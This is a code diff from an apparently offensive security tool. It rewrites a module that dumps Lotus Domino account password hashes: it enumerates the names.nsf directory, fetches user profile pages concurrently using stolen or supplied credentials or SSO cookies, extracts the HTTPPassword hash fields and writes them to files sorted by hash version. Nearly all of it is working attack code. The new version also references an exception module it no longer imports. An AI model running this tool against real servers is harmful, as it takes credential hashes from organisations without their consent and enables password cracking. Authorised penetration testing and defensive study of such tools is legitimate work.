@@ -1,4 +1,4 @@
-# Copyright (c) 2016, Brandan Geise [coldfusion]
+# Copyright (c) 2017, Brandan Geise [coldfusion]
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -17,145 +17,158 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
-import re
-import requests
-from bs4 import BeautifulSoup
-from simple_requests import Requests
+import aiohttp
+import asyncio
+import bs4
+import inflect
+import signal
+import sys
 
-from domi_owned import utility
-
-try:
-	requests.packages.urllib3.disable_warnings()
-except:
-	pass
+from .main import DomiOwned
 
 
-# Get user profile URLs
-def enum_accounts(target, username, password, auth):
-	accounts = []
-	account_urls = []
+class HashDump(DomiOwned):
 
-	names_url = "{0}/names.nsf".format(target)
+	def dump(self):
+		"""
+		Dump Domino account hashes.
+		"""
+		# Check if the user can access names.nsf
+		if self.check_access(self.username, self.password)['names.nsf']:
 
-	for page in range(1, 100000, 1000):
-		pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(target, page)
-		try:
-			if auth == 'basic':
-				access = utility.basic_auth(names_url, username, password)
-			elif auth == 'form':
-				access, session = utility.form_auth(names_url, username, password)
+			if self.auth_type == 'basic':
+				self.session.auth = (self.username, self.password)
+
+			# Enumerate account URLs
+			account_urls = self.get_accounts()
+			if account_urls:
+				self.logger.info("Found {0} account {1}".format(len(account_urls), inflect.engine().plural('hash', len(account_urls))))
+				self.get_hashes(account_urls)
 			else:
-				access = None
-
-			if access or auth == 'open':
-				if auth == 'basic':
-					request = requests.get(pages, headers=utility.get_headers(), auth=(username, password), timeout=60, verify=False)
-				elif auth == 'form':
-					request = session.get(pages, headers=utility.get_headers(), timeout=60, verify=False)
-				else:
-					request = requests.get(pages, headers=utility.get_headers(), timeout=60, verify=False)
-
-				soup = BeautifulSoup(request.text, 'lxml')
-
-				# Break if page not found
-				if 'No documents found' in soup.findAll('h2'):
-					break
-				else:
-					links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
-					for link in links:
-						account_regex = re.compile('/([a-f0-9]{32}/[a-f0-9]{32})', re.I)
-						if account_regex.search(link) and account_regex.search(link).group(1) not in accounts:
-							accounts.append(account_regex.search(link).group(1))
-						else:
-							pass
-			else:
-				utility.print_warn("Unable to access {0}, bad username or password".format(names_url))
-				break
-
-		except Exception as error:
-			utility.print_error("Error: {0}".format(error))
-			break
-
-	if len(accounts) > 0:
-		if len(accounts) == 1:
-			plural = ''
+				self.logger.warn('No account hashes found')
 		else:
-			plural = 's'
+			self.logger.error("Unable to access {0}/names.nsf, bad username or password".format(self.url))
 
-		utility.print_good("Found {0} account{1}".format(len(accounts), plural))
+	def get_accounts(self):
+		"""
+		Enumerate Domino account profile URLs.
+		"""
+		account_urls = []
 
-		for unid in accounts:
-			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(target, unid))
+		for page in range(1, sys.maxsize**10, 1000):
+			try:
+				response = self.session.get(
+					"{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(self.url, page)
+				)
+			except KeyboardInterrupt:
+				break
+			except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
+				self.logger.error('An error occurred while enumerating account profile URLs')
+				break
 
-		async_requests(account_urls, username, password)
-	else:
-		utility.print_warn('No hashes found')
+			soup = bs4.BeautifulSoup(response.text, 'lxml')
 
-
-# Asynchronously get accounts
-def async_requests(accounts, username, password):
-	requests = Requests(concurrent=40)
-	requests.session.headers = utility.get_headers()
-	requests.session.auth = (username, password)
-	requests.session.verify = False
-
-	try:
-		for account_url in requests.swarm(accounts, maintainOrder=False):
-			if account_url.status_code == 200:
-				get_domino_hash(account_url)
-
-	except KeyboardInterrupt:
-		requests.stop(killExecuting=True)
-
-
-# Dump Domino hashes
-def get_domino_hash(response):
-	soup = BeautifulSoup(response.text, 'lxml')
-	try:
-
-		# Get account username
-		username_params = ['$dspShortName', '$dspFullName']
-		for user_param in username_params:
-			domino_username = (soup.find('input', attrs={'name': user_param}))['value']
-			if len(domino_username) > 0:
+			# Break if page not found
+			if 'No documents found' in str(soup.findAll('h2')):
 				break
 			else:
-				continue
+				links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
+				for link in links:
+					if self.utilities.ACCOUNT_REGEX.search(link):
+						account_url = "{0}/names.nsf/{1}?OpenDocument".format(self.url, self.utilities.ACCOUNT_REGEX.search(link).group(1))
+						account_urls.append(account_url)
 
-		# Get account hash
-		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
-		for hash_param in hash_params:
-			domino_hash = (soup.find('input', attrs={'name': hash_param}))['value']
-			if len(domino_hash) > 0:
-				break
+		return list(set(account_urls))
+
+	def signal_handler(self):
+		"""
+		Gracefully handle exiting hash dump.
+		"""
+		self.logger.debug('Got Ctrl-C, stopping all tasks...')
+		for task in asyncio.Task.all_tasks():
+			task.cancel()
+
+	def get_hashes(self, urls):
+		"""
+		Create client session based on authentication type.
+		"""
+		loop = asyncio.get_event_loop()
+		loop.add_signal_handler(signal.SIGINT, self.signal_handler)
+
+		if self.username and self.auth_type == 'basic':
+			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, auth=aiohttp.BasicAuth(self.username, self.password), loop=loop)
+
+		elif self.auth_type == 'form':
+			# Check if cookies or SSO are being used for authentication
+			if 'DomAuthSessId' in self.session.cookies:
+				session_id = dict(DomAuthSessId=self.session.cookies['DomAuthSessId'])
+			elif 'LtpaToken' in self.session.cookies:
+				session_id = dict(LtpaToken=self.session.cookies['LtpaToken'])
 			else:
-				continue
+				session_id = None
 
-	except:
-		pass
+			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, cookies=session_id, loop=loop)
 
-	if domino_username and domino_hash:
-		print("{0}, {1}".format(domino_username.encode('utf-8'), domino_hash))
-		write_hash(domino_username.encode('utf-8'), domino_hash)
+		else:
+			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, loop=loop)
 
+		with client as session:
+			try:
+				loop.run_until_complete(self.query(session, urls))
+			except asyncio.CancelledError:
+				sys.exit()
+			except Exception as error:
+				self.logger.error('An error occurred while dumping Domino account hashes')
+				sys.exit()
 
-# Sort and write hashes to file
-def write_hash(duser, dhash):
-	# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
-	if len(dhash) == 34:
-		dhash = dhash.strip('()')
-		outfile = 'domino_5_hashes.txt'
+	async def query(self, session, urls):
+		"""
+		Build asynchronous requests.
+		"""
+		await asyncio.gather(*[self.get(session, url) for url in urls])
 
-	# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
-	elif len(dhash) == 22:
-		outfile = 'domino_6_hashes.txt'
+	async def get(self, session, url):
+		"""
+		Asynchronously request account URL and parse response.
+		"""
+		async with session.get(url, compress=True) as response:
+			self.parse_hash(await response.text())
 
-	# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
-	else:
-		outfile = 'domino_8_hashes.txt'
+	def parse_hash(self, data):
+		"""
+		Sort Domino hashes by type and write output to a file.
+		"""
+		soup = bs4.BeautifulSoup(data, 'lxml')
 
-	# Write to file
-	output = open(outfile, 'a')
-	hash_format = "{0}:{1}\n".format(duser, dhash)
-	output.write(hash_format)
-	output.close()
+		# Domino account username fields
+		for user_param in ['$dspFullName', '$dspShortName']:
+			domino_username = soup.find('input', attrs={'name': user_param})['value']
+			if domino_username:
+				break
+
+		# Domino account hash fields
+		for hash_param in ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']:
+			domino_hash = soup.find('input', attrs={'name': hash_param})['value']
+			if domino_hash:
+				break
+
+		if domino_username and domino_hash:
+			print("{0}:{1}".format(domino_username, domino_hash))
+
+			hash_length = len(domino_hash)
+
+			# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
+			if hash_length == 34:
+				domino_hash = domino_hash.strip('()')
+				out_file = 'domino_5_hashes.txt'
+
+			# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
+			elif hash_length == 22:
+				out_file = 'domino_6_hashes.txt'
+
+			# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
+			else:
+				out_file = 'domino_8_hashes.txt'
+
+			f = open(out_file, 'a')
+			f.write("{0}:{1}\n".format(domino_username, domino_hash))
